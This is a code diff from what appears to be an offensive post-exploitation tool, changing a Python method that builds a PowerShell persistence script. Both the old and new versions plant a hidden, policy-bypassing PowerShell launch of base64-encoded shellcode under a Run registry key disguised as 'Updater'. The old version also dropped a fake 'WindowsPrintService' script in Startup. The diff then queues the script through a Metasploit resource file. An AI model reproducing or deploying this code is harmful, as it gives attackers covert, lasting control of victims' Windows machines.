@@ -16,8 +16,7 @@ class EXTRAS(object):
 
     def PERSISTENCE(self):
         with open('persist.ps1', 'w') as persistfile:
-            persistfile.write("""$persist = 'New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc """ +
-                              base64.b64encode(self.injectshellcode_sleep.encode('utf_16_le')) + '\"\'; iex $persist; echo $persist > \"$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPrintService.ps1\"')
+            persistfile.write("echo \"%s\" | out-file $env:USERPROFILE/update.txt;New-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name Updater -PropertyType String -Value 'C:\\Windows\\System32\WindowsPowerShell\\v1.0\\powershell.exe -c \"powershell -exec bypass -NonInteractive -WindowStyle Hidden -enc (Get-Content $env:USERPROFILE\update.txt)\"'" % base64.b64encode(self.injectshellcode_sleep.encode('utf_16_le')))
             persistfile.close()
         with open('persist.rc', 'w') as persistfilerc:
             persistfilerc.write("""run post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1""")
